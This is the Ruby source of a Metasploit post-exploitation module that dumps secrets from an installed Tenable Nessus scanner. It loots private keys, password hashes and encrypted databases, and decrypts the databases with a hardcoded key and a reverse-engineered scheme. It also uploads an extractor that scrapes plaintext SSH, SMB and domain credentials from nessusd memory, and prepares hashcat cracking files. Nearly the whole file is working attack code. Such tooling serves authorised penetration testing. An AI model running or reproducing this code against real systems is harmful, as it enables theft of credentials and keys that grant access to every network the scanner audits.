##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Linux::System
  include Msf::Post::Linux::Priv
  include Msf::Post::File
  include Msf::Auxiliary::Report

  # relative paths (under the Nessus install root) looted by the FILES action
  LOOT_FILES = {
    'master.key' => ['var/nessus/master.key', 'application/octet-stream', 'Database encryption key material'],
    'global.db' => ['var/nessus/global.db', 'application/octet-stream', 'Encrypted database (policies, users, scans)'],
    'global.db-wal' => ['var/nessus/global.db-wal', 'application/octet-stream', 'Encrypted database write-ahead log'],
    'global.db-shm' => ['var/nessus/global.db-shm', 'application/octet-stream', 'Encrypted database shared memory file'],
    'cakey.pem' => ['var/nessus/CA/cakey.pem', 'application/x-pem-file', 'Scanner CA private key (cert forgery)'],
    'serverkey.pem' => ['var/nessus/CA/serverkey.pem', 'application/x-pem-file', 'Scanner TLS server private key'],
    'cacert.pem' => ['com/nessus/CA/cacert.pem', 'application/x-pem-file', 'Scanner CA certificate'],
    'servercert.pem' => ['com/nessus/CA/servercert.pem', 'application/x-pem-file', 'Scanner TLS server certificate'],
    'nessusd.conf.imported' => ['etc/nessus/nessusd.conf.imported', 'text/plain', 'Imported nessusd configuration'],
    'nessus.version' => ['var/nessus/nessus.version', 'text/plain', 'Nessus version'],
    'plugin_feed_info.inc' => ['lib/nessus/plugins/plugin_feed_info.inc', 'text/plain', 'Plugin feed info']
  }.freeze

  # credential service mapping for scan policy credentials
  SVC_MAP = {
    'SSH' => [22, 'ssh'],
    'SMB' => [445, 'smb'],
    'Windows' => [445, 'smb'],
    'Kerberos' => [88, 'kerberos'],
    'AD' => [389, 'ldap'],
    'LDAP' => [389, 'ldap'],
    'HTTP' => [80, 'http'],
    'HTTPS' => [443, 'https'],
    'FTP' => [21, 'ftp'],
    'Telnet' => [23, 'telnet'],
    'Database' => [3306, 'database'],
    'Cloud' => [443, 'cloud'],
    'SNMP' => [161, 'snmp'],
    'SNMPv3' => [161, 'snmp']
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Nessus Scanner Secret Dump',
        'Description' => %q{
          This module extracts secrets from an installed Tenable Nessus
          scanner (or Nessus Agent). It runs in these lanes:

          FILES - loot master.key, the encrypted global.db (+wal/shm), the
          scanner CA/TLS keys (certificate forgery) and the web UI password
          hashes for offline work.

          DECRYPT_DB - the at-rest chain runs ON THE TARGET inside the
          python extractor (openssl CLI, no extra deps) and needs no
          process memory at all: master.key is unwrapped with a constant
          hardcoded in nessusd/nessuscli (AES-128-OFB), yielding a SQLite
          PASSWD table whose secret derives the per-install file key via
          RC4[0::8]; global.db + its WAL then decrypt block-by-block and
          UserApiKeys rows, the PASSWD secret and the file key are
          reported. The FILES action additionally decrypts the looted
          files OPERATOR-SIDE in Ruby (works when transfers are small
          enough; large DBs are covered by the on-target lane).

          MEMORY - nessusd holds every scan policy credential in plaintext
          in its heap (serialized policy JSON plus the decrypted database
          page cache), so with root the module scans the process memory and
          recovers SSH/SMB/AD/etc usernames, passwords, domains, SSH
          private keys and REST API key pairs (accessKey/secretKey - the
          secretKey only ever exists in plaintext here, at rest it is
          stored hashed) regardless of the at-rest database encryption.

          The agent linking key and the NASL plugin signature check status
          are also collected via nessuscli when possible, along with
          scanner info: plugin set (+decoded stamp), feed type, plugin
          database update time and policy template version.

          The extractor also emits a NessusClientData_v2 .nessus XML
          export for every decrypted report (verified semantically against
          the live export API). DUMP_SCANS (default -1 = all, ALL action)
          pulls those XMLs back as loot; 0 disables, N pulls only the N
          most recently modified source reports. IMPORT_SCANS (default
          false) then db_imports them into the Metasploit workspace
          (hosts/ports/vulns; credentials are always reported via the
          creds tables regardless).

          REST API keys at rest are MD5(salt_hex + secret_hex) in the
          UserApiKeys table (accessKey plaintext, secretKey hashed), so
          stored rows are captured any time and written to a hashcat-ready
          loot file (api_key_hashes.hashcat, one hash:salt per line). Crack
          the secretKey offline with:
          hashcat -m 20 api_key_hashes.hashcat <wordlist or mask>
          (-m 20 = md5($salt.$pass))
          john --format=dynamic_4 api_key_hashes.hashcat
          (dynamic_4 = md5($s.$p))
          The secretKey is server-generated random 64-hex (256 bits), so
          brute force is infeasible - this pays off only against a weak
          generator or candidates obtained elsewhere (client configs,
          leaks), verified offline with no API traffic.

          Tested against Nessus 10.12.0 (Nessus Professional, Ubuntu).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die'
        ],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Actions' => [
          ['FILES', { 'Description' => 'Loot key material, databases and hashes' }],
          ['MEMORY', { 'Description' => 'Scan nessusd memory for policy credentials' }],
          ['ALL', { 'Description' => 'Run all lanes' }]
        ],
        'DefaultAction' => 'ALL',
        'References' => [
          ['URL', 'https://docs.tenable.com/nessus/Content/RetrieveLinkingKey.htm'],
          ['URL', 'https://docs.tenable.com/nessus-agents/Content/NessusCLIAgent.htm']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK],
          'Reliability' => []
        }
      )
    )
    register_options [
      OptString.new('NESSUS_DIR', [false, 'Nessus install root (auto-detect if blank)', '']),
      OptBool.new('GET_DB', [true, 'Loot global.db (+wal/shm) for offline cracking', true]),
      OptBool.new('DECRYPT_DB', [true, 'After looting master.key + global.db: decrypt them locally (offline chain) and harvest UserApiKeys, policy credentials and users from the plaintext database', true]),
      OptInt.new('DUMP_SCANS', [true, 'Pull decrypted scans back as .nessus XML (ALL action): -1 = all (default), 0 = none, N = the N most recently modified source reports', -1]),
      OptBool.new('IMPORT_SCANS', [true, 'db_import the dumped .nessus files into the Metasploit workspace', false]),
    ]
    register_advanced_options [
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),
      OptInt.new('MEM_LIMIT', [true, 'Maximum MB of nessusd memory to scan per process', 4096])
    ]
  end

  def run
    @nessus_dir = datastore['NESSUS_DIR'].to_s.empty? ? find_nessus_dir : datastore['NESSUS_DIR']
    fail_with(Failure::NotFound, 'Nessus installation not found (try setting NESSUS_DIR)') if @nessus_dir.nil?

    print_status("Nessus install: #{@nessus_dir}")
    version = read_file("#{@nessus_dir}/var/nessus/nessus.version").to_s.strip
    print_status("Nessus version: #{version.empty? ? 'unknown' : version}")
    unless is_root?
      print_warning('Not root: key files and the memory scan usually require root')
    end
    print_scanner_info

    case action.name
    when 'FILES'
      run_files
      run_decrypt_db if datastore['DECRYPT_DB']
    when 'MEMORY'
      run_memory
    else
      run_files
      run_memory
      run_decrypt_db if datastore['DECRYPT_DB']
      run_report_pull if datastore['DUMP_SCANS'] != 0
    end
  end

  ##
  # offline decrypt lane: master.key + global.db looted by FILES are
  # decrypted OPERATOR-SIDE (pure Ruby OpenSSL, nothing runs on the
  # target) using the reverse-engineered chain:
  #   master.key = AES-128-OFB(K_HARDCODED) -> SQLite PASSWD secret
  #   K_file     = RC4(secret)[0::8][:32]
  #   global.db  = AES-128-OFB(K_file[:16]) per 1024-block, tweak =
  #                u32le(block) || block-tail-12, block-1 marker plain
  ##

  K_HARDCODED = ['7b815a686e0a7c1c567b72f1d413796c6ef1fd4846c947ab886aacdf5f604695'].pack('H*').freeze

  def ofb_xor(key16, tweak16, data)
    cipher = OpenSSL::Cipher.new('AES-128-OFB')
    cipher.key = key16
    cipher.iv = tweak16
    cipher.update(data) + cipher.final
  end

  def decrypt_blocks(key16, data)
    out = +''
    (data.length / 1024).times do |i|
      base = i * 1024
      blk = data[base, 1012]
      tweak = [i + 1].pack('V') + data[base + 1012, 12]
      pt = ofb_xor(key16, tweak, blk)
      if i.zero?
        pt[16, 8] = data[base + 16, 8] # marker stored plaintext
      end
      out << pt << data[base + 1012, 12]
    end
    out
  end

  def rc4_keystream(key, count = 256)
    box = (0..255).to_a
    j = 0
    keybytes = key.bytes
    (0..255).each do |idx|
      j = (j + box[idx] + keybytes[idx % keybytes.length]) & 0xff
      box[idx], box[j] = box[j], box[idx]
    end
    out = +''
    i = j = 0
    count.times do
      i = (i + 1) & 0xff
      j = (j + box[i]) & 0xff
      box[i], box[j] = box[j], box[i]
      out << (box[(box[i] + box[j]) & 0xff]).chr
    end
    out
  end

  def read_file_b64(path)
    # binary-safe AND truncation-safe: shell channels mangle raw bytes
    # and cap single-command output at ~64KB - pull the base64 in chunks
    size = cmd_exec("stat -c %s #{path} 2>/dev/null").to_s.strip.to_i
    return nil if size.zero?

    chunk = 48 * 1024
    b64 = +''
    (0...size).step(chunk) do |off|
      part = cmd_exec("dd if=#{path} bs=1024 skip=#{off / 1024} count=#{chunk / 1024} 2>/dev/null | base64 -w0", nil, 600).to_s
      b64 << part.gsub(/\s+/, '')
    end
    data = b64.unpack1('m')
    data.nil? || data.empty? ? nil : data
  end

  # quick host/port/finding counts from an in-memory .nessus XML
  def scan_xml_summary(data)
    require 'rexml/document'
    doc = REXML::Document.new(data)
    hosts = 0
    ports = 0
    vulns = 0
    doc.elements.each('//ReportHost') { hosts += 1 }
    doc.elements.each('//ReportItem') do |item|
      vulns += 1
      ports += 1 if item.attribute('port').to_s.to_i > 0
    end
    "import: #{hosts} host#{hosts == 1 ? '' : 's'}, #{ports} port#{ports == 1 ? '' : 's'}, #{vulns} vulnerabilit#{vulns == 1 ? 'y' : 'ies'}"
  rescue StandardError
    nil
  end

  def run_decrypt_db
    if @on_target_db_done
      vprint_status('DECRYPT_DB: on-target decrypt already harvested everything - skipping the operator-side lane')
      return
    end

    master = read_file_b64("#{@nessus_dir}/var/nessus/master.key")
    global = read_file_b64("#{@nessus_dir}/var/nessus/global.db")
    if master.to_s.empty? || global.to_s.empty?
      print_error('DECRYPT_DB: master.key or global.db unreadable - skipping')
      return
    end

    mk_plain = decrypt_blocks(K_HARDCODED[0, 16], master)
    unless mk_plain[0, 15] == 'SQLite format 3' && mk_plain.getbyte(15).to_i.zero?
      print_error('DECRYPT_DB: master.key unwrap failed (no SQLite magic)')
      return
    end

    # PASSWD secret: the 64-char printable row value in the tiny key db
    secret = mk_plain[/[A-Za-z0-9]{64}/]
    if secret.to_s.empty?
      print_error('DECRYPT_DB: no PASSWD secret found in master.key plaintext')
      return
    end
    file_key = rc4_keystream(secret)[0, 256].bytes.each_slice(8).map(&:first).pack('C*')[0, 32]

    db_plain = decrypt_blocks(file_key[0, 16], global)
    unless db_plain[0, 15] == 'SQLite format 3' && db_plain.getbyte(15).to_i.zero?
      print_error('DECRYPT_DB: global.db decrypt failed (no SQLite magic)')
      return
    end
    loot = store_loot('nessus.globaldb.plain', 'application/x-sqlite3', session,
                      db_plain, 'global.db.sqlite', 'Nessus global.db DECRYPTED (offline)')
    print_good("global.db decrypted operator-side -> #{loot}")
    print_status("PASSWD secret: #{secret}")

    wal_plain = +''
    wal = read_file_b64("#{@nessus_dir}/var/nessus/global.db-wal").to_s
    if !wal.empty? && wal[0, 4] == [0x377f0682].pack('N') # SQLite WAL magic
      wal_plain = decrypt_wal(file_key[0, 16], wal)
      unless wal_plain.empty?
        store_loot('nessus.globalwal.plain', 'application/octet-stream', session,
                   wal_plain, 'global.db-wal.pages', 'Nessus global.db-wal page images DECRYPTED (offline)')
        print_good("global.db-wal page images decrypted (#{wal_plain.length / 1024} pages)")
      end
    end

    harvest_decrypted_db([db_plain, wal_plain])
  end

  # WAL: 32-byte header, then frames of 24-byte header + one 1024-byte
  # block; each frame's block counter = the frame's page number
  def decrypt_wal(key16, wal)
    out = +''
    off = 32
    while off + 24 + 1024 <= wal.length
      pgno = wal[off, 4].unpack1('N')
      blk = wal[off + 24, 1024]
      tweak = [pgno].pack('V') + blk[1012, 12]
      out << ofb_xor(key16, tweak, blk[0, 1012]) << blk[1012, 12]
      off += 24 + 1024
    end
    out
  end

  def harvest_decrypted_db(dbs)
    report = { 'creds' => [], 'api_keys' => [], 'api_keys_stored' => [], 'ssh_keys' => [], 'errors' => [] }
    blob = dbs.join

    # UserApiKeys rows: {"hash":"..","accessKey":"..","salt":".."} (plain JSON)
    blob.scan(/\{"hash":"([0-9a-f]{32})","accessKey":"([0-9a-f]{64})","salt":"([0-9a-f]{64})"\}/).each do |h, a, sl|
      report['api_keys_stored'] << { 'access_key' => a, 'hash' => h, 'salt' => sl }
    end

    # policy credentials - same shapes the memory lane finds
    blob.scan(/"(SSH|SMB|AD|LDAP|HTTPS?)":\[\{[^}]{0,600}?"username":"([^"]*)"[^}]{0,600}?"password":"([^"]*)"/).each do |svc, user, pw|
      report['creds'] << {
        'service' => svc, 'auth_method' => '', 'username' => user,
        'password' => pw, 'domain' => '', 'pid' => 'db'
      }
    end

    process_report(report)
  end

  ##
  # scanner info (always printed)
  ##

  def print_scanner_info
    feed = read_file("#{@nessus_dir}/lib/nessus/plugins/plugin_feed_info.inc").to_s
    set = feed[/PLUGIN_SET\s*=\s*"([^"]+)"/, 1]
    if set
      stamp = set.length == 12 ? "#{set[0, 4]}-#{set[4, 2]}-#{set[6, 2]} #{set[8, 2]}:#{set[10, 2]}" : set
      print_status("Plugin set: #{set} (#{stamp})")
    end
    if (feedtype = feed[/PLUGIN_FEED\s*=\s*"([^"]+)"/, 1])
      print_status("Plugin feed: #{feedtype}")
    end
    mtime = cmd_exec("stat -c %y #{@nessus_dir}/var/nessus/plugins-desc.db 2>/dev/null", nil, 30).to_s.split('.').first.to_s.strip
    print_status("Plugins last updated: #{mtime}") unless mtime.empty?
    tpl = read_file("#{@nessus_dir}/var/nessus/templates/metadata.json").to_s
    if (tver = tpl[/"version"\s*:\s*"([^"]+)"/, 1])
      print_status("Policy template version: #{tver}")
    end
  end

  def find_nessus_dir
    ['/opt/nessus', '/opt/nessus_agent'].each do |d|
      return d if directory?(d)
    end
    nil
  end

  ##
  # scan dump lane (.nessus export + optional db_import)
  ##

  ##
  # report XML pull lane: the extractor already decrypted every on-disk
  # report and emitted .nessus XML beside each (temp dir on the target);
  # pull those back as loot, optionally db_import them, then clean up.
  # DUMP_SCANS selects how many: -1 all, N the N most recently modified
  # source reports, 0 skips the lane entirely.
  ##

  def run_report_pull
    entries = @report_xml || []
    if entries.empty?
      print_status('No decrypted report XML available (no on-disk reports, or the decrypt failed)')
      return
    end

    # newest first by source-report mtime
    entries = entries.sort_by { |e| -cmd_exec("stat -c %Y #{e['report']} 2>/dev/null").to_s.strip.to_i }
    count = datastore['DUMP_SCANS']
    selected = count == -1 ? entries : entries.first(count)
    label = count == -1 ? 'ALL' : "the #{count} most recently modified"
    print_status("Pulling #{label} scan XML #{selected.length == 1 ? 'export' : 'exports'} from the decrypted reports")

    loot_paths = []
    selected.each do |e|
      data = read_file_b64(e['path'])
      next if data.to_s.empty?

      name = File.basename(e['path'])
      loot = store_loot('nessus.scan.xml', 'application/xml', session,
                        data, name, "Nessus scan XML (decrypted from #{e['report']})")
      print_good("#{name} -> #{loot} (#{scan_xml_summary(data)})")
      loot_paths << loot
      rm_f(e['path'])
      rm_f(e['path'].sub(/\.nessus$/, '.sqlite'))
    end
    # tidy the temp dir if we emptied it
    dirs = selected.map { |e| File.dirname(e['path']) }.uniq
    dirs.each { |d| cmd_exec("rmdir #{d} 2>/dev/null") }
    print_status("Pulled #{loot_paths.length} .nessus XML files as loot")

    import_nessus_files(loot_paths) if datastore['IMPORT_SCANS'] && !loot_paths.empty?
  end

  def import_nessus_files(paths)
    unless framework.db.active
      print_warning('IMPORT_SCANS: no database connected - skipping import')
      return
    end

    paths.each do |path|
      before_hosts = framework.db.hosts(workspace: myworkspace).count
      before_vulns = framework.db.vulns(workspace: myworkspace).count
      begin
        # the importer yields (:filetype/:address/:os/:port/...) progress ticks - swallow them
        framework.db.import_file(filename: path) { |_type, _data| }
        new_hosts = framework.db.hosts(workspace: myworkspace).count - before_hosts
        new_vulns = framework.db.vulns(workspace: myworkspace).count - before_vulns
        print_good("Imported #{File.basename(path)}: #{new_hosts} host#{new_hosts == 1 ? '' : 's'}, #{new_vulns} vulnerabilit#{new_vulns == 1 ? 'y' : 'ies'}")
      rescue StandardError => e
        print_error("Import failed for #{File.basename(path)}: #{e}")
        unless session.type == 'meterpreter'
          print_error('The file is likely corrupt due to file transfer limitations in non-meterpreter' \
                      ' sessions - upgrade to a meterpreter session (run post/multi/manage/shell_to_meterpreter)' \
                      ' before attempting large file transfers')
        end
      end
    end
  end

  ##
  # FILES lane
  ##

  def run_files
    tbl = Rex::Text::Table.new(
      'Header' => 'Nessus Looted Files',
      'Indent' => 1,
      'Columns' => ['File', 'Size', 'Loot']
    )

    files = LOOT_FILES.dup
    files.reject! { |k, _| k.start_with?('global.db') } unless datastore['GET_DB']

    files.each do |id, (rel, ctype, desc)|
      path = "#{@nessus_dir}/#{rel}"
      next unless file?(path)

      loot_file(id, path, ctype, desc, tbl)
    end

    # web UI password hashes, one per user
    cmd_exec("ls #{@nessus_dir}/var/nessus/users/*/auth/hash 2>/dev/null").to_s.split.each do |path|
      user = path.split('/')[-3]
      loot_file("user_#{user}_hash", path, 'text/plain', "Web UI password hash (#{user})", tbl)
    end
    cmd_exec("ls #{@nessus_dir}/var/nessus/users/*/auth/admin 2>/dev/null").to_s.split.each do |path|
      user = path.split('/')[-3]
      loot_file("user_#{user}_admin", path, 'text/plain', "Web UI admin flag (#{user})", tbl)
    end

    if tbl.rows.empty?
      print_error('No lootable files found (permissions?)')
    else
      print_good(tbl.to_s)
    end
    vprint_status('global.db/master.key looted (envelope-encrypted; the extractor decrypts them on-target)')
  end

  # resolve embedded extractor scripts relative to the framework root so
  # they work from a repo checkout (module loadpath) and an install alike
  def data_path(name)
    ::File.expand_path("../../../../../data/post/tenable/nessus/#{name}", __FILE__)
  end

  def loot_file(id, path, ctype, desc, tbl)
    # generous timeout: shells on slow links stall well past the cmd_exec default
    data = cmd_exec("cat #{path}", nil, 120)
    return if data.nil? || data.empty?

    loot_path = store_loot("nessus.#{id}", ctype, session, data, File.basename(path), "Nessus #{desc}")
    tbl << [path, data.length, loot_path]
  rescue StandardError => e
    print_error("Failed to loot #{path}: #{e}")
  end

  ##
  # MEMORY lane
  ##

  def run_memory
    if cmd_exec('command -v python3 2>/dev/null').to_s.strip.empty?
      print_error('No python3 on the target for the memory scan; loot the database with the FILES lane instead')
      return
    end

    output = run_extractor('python3', data_path('nessus_dump.py'))
    return if output.nil?

    begin
      report_data = JSON.parse(output)
    rescue JSON::ParserError => e
      print_error("Error parsing extractor output: #{e}")
      vprint_error(output[0, 2048])
      return
    end

    process_report(report_data)
  end

  def run_extractor(interpreter, script_file)
    script_path = "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alphanumeric(8..10)}"
    vprint_status("Uploading extractor to #{script_path}")
    fail_with(Failure::BadConfig, "Unable to write to #{script_path}") unless upload_file(script_path, script_file)
    vprint_status("Running #{interpreter} extractor")
    output = cmd_exec("#{interpreter} #{script_path} #{@nessus_dir} #{datastore['MEM_LIMIT']}", nil, 600)
    rm_f(script_path)
    if output.to_s.strip.empty?
      print_error('Extractor produced no output')
      return nil
    end
    output
  end

  ##
  # shared report processing
  ##

  def process_report(report)
    # memory-scan bookkeeping
    (report['scanned_bytes'] || {}).each do |pid, bytes|
      vprint_status("nessusd pid #{pid}: scanned #{bytes} bytes")
    end
    (report['errors'] || []).each { |e| vprint_error(e) }

    if report['agent_linking_key']
      print_good("Agent linking key: #{report['agent_linking_key']}")
      store_loot('nessus.agent_linking_key', 'text/plain', session, report['agent_linking_key'], 'agent_linking_key.txt', 'Nessus agent linking key')
    end
    if report['nasl_no_signature_check']
      if report['nasl_no_signature_check'] == 'yes'
        print_warning('NASL plugin signature checking is DISABLED on this scanner (custom plugins load)')
      else
        vprint_status("NASL plugin signature checking: #{report['nasl_no_signature_check']}")
      end
    end

    # on-target DB decrypt (extractor 'db' section): merge stored rows and
    # surface the at-rest secret + derived file key
    db = report['db'] || {}
    if (secret = db['passwd_secret'])
      @on_target_db_done = true
      print_good("At-rest PASSWD secret (on-target decrypt): #{secret}")
    end
    if (fkey = db['db_file_key'])
      print_status("global.db file key: #{fkey}")
    end
    (db['reports_decrypted'] || []).each do |rep|
      print_good("Report DECRYPTED on-target: #{rep}")
    end
    @reports_decrypted = true unless (db['reports_decrypted'] || []).empty?
    @report_xml = db['report_xml'] || []
    (db['creds'] || []).each do |row|
      report['creds'] ||= []
      unless report['creds'].any? { |r| r['service'] == row['service'] && r['username'] == row['username'] && r['password'] == row['password'] }
        report['creds'] << row
      end
    end
    if (pcount = db['policies_decrypted'])
      print_status("Scan policy credentials recovered from #{pcount} decrypted policies (see Nessus Policy Credentials)")
    end
    db_stored = db['api_keys_stored'] || {}
    unless db_stored.empty?
      report['api_keys_stored'] ||= []
      db_stored.each_value do |row|
        report['api_keys_stored'] << row unless report['api_keys_stored'].any? { |r| r['access_key'] == row['access_key'] }
      end
    end

    creds = report['creds'] || []
    ssh_keys = report['ssh_keys'] || []
    api_keys = report['api_keys'] || []
    return if creds.empty? && ssh_keys.empty? && api_keys.empty? && (report['api_keys_stored'] || []).empty?

    loot = store_loot('nessus.creds', 'application/json', session, JSON.pretty_generate(report), 'creds.json', 'Nessus credentials JSON')
    print_good("Full extractor output stored to: #{loot}")

    tbl = Rex::Text::Table.new(
      'Header' => 'Nessus Policy Credentials',
      'Indent' => 1,
      'Columns' => ['Service', 'Auth', 'Username', 'Password', 'Domain']
    )
    creds.each { |cred| report_password_cred(cred, tbl) }
    print_good(tbl.to_s) unless tbl.rows.empty?

    key_tbl = Rex::Text::Table.new(
      'Header' => 'Nessus SSH Keys',
      'Indent' => 1,
      'Columns' => ['SHA256', 'First line']
    )
    ssh_keys.each { |pem| report_ssh_key(pem, key_tbl) }
    print_good(key_tbl.to_s) unless key_tbl.rows.empty?

    api_tbl = Rex::Text::Table.new(
      'Header' => 'Nessus REST API Keys',
      'Indent' => 1,
      'Columns' => ['Access Key', 'Secret Key']
    )
    api_keys.each { |key| report_api_key(key, api_tbl) }
    print_good(api_tbl.to_s) unless api_tbl.rows.empty?

    stored = report['api_keys_stored'] || []
    unless stored.empty?
      # hash:salt lines ready for `hashcat -m 20` (md5($salt.$pass)) or
      # `john --format=dynamic_4` - the secretKey is server-generated
      # random 64-hex, so this only pays off against a weak/future
      # generator or a candidate list from elsewhere
      hash_file = stored.map { |k| "#{k['hash']}:#{k['salt']}" }.join("\n") + "\n"
      hash_loot = store_loot('nessus.api_key_hashes', 'text/plain', session, hash_file, 'api_key_hashes.hashcat', 'Nessus API key hashes (hashcat -m 20 / john dynamic_4)')
      print_status("hashcat-ready hash:salt file: #{hash_loot} (hashcat -m 20 / john --format=dynamic_4)")
    end

    stored_tbl = Rex::Text::Table.new(
      'Header' => 'Nessus REST API Keys (stored rows - secret recoverable only at generation)',
      'Indent' => 1,
      'Columns' => ['Access Key', 'MD5(salt+secret)', 'Salt']
    )
    stored.each do |key|
      stored_tbl << [key['access_key'], key['hash'], key['salt']]
    end
    print_good(stored_tbl.to_s) unless stored_tbl.rows.empty?
  end

  def report_password_cred(cred, tbl)
    report_password_cred!(cred, tbl)
  rescue ActiveRecord::RecordInvalid => e
    print_error("Credential creation failed for #{cred['service']}/#{cred['username']}: #{e}")
  end

  def report_password_cred!(cred, tbl)
    port, service = SVC_MAP.fetch(cred['service'], [0, cred['service'].downcase])
    proto = cred['service'] =~ /^SNMP/ ? 'udp' : 'tcp'
    service_data = {
      address: '0.0.0.0',
      port: port,
      service_name: service,
      protocol: proto,
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: cred['username'],
      private_data: cred['password'],
      private_type: :password
    }
    if !cred['domain'].to_s.empty?
      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
      credential_data[:realm_value] = cred['domain']
    end

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    if port > 0
      begin
        login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }
        login_data.merge!(service_data)
        create_credential_login(login_data)
      rescue ActiveRecord::RecordInvalid => e
        vprint_error("cred login failed for #{cred['service']}: #{e}")
      end
    end

    tbl << [cred['service'], cred['auth_method'], cred['username'], cred['password'], cred['domain']]
  end

  def report_api_key(key, tbl)
    # the API answers on the scanner's own HTTPS port; the pair authenticates
    # as the key's owning user (X-ApiKeys header)
    service_data = {
      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
      port: 8834,
      service_name: 'nessus-api',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: key['access_key'],
      private_data: key['secret_key'],
      private_type: :password
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }
    login_data.merge!(service_data)
    create_credential_login(login_data)

    tbl << [key['access_key'], key['secret_key']]
  end

  def report_ssh_key(pem, tbl)
    service_data = {
      address: '0.0.0.0',
      port: 22,
      service_name: 'ssh',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: '',
      private_data: pem,
      private_type: :ssh_key
    }
    credential_data.merge!(service_data)
    create_credential(credential_data)

    tbl << [Digest::SHA256.hexdigest(pem)[0, 16], pem.lines.first.to_s.strip]
  end
end
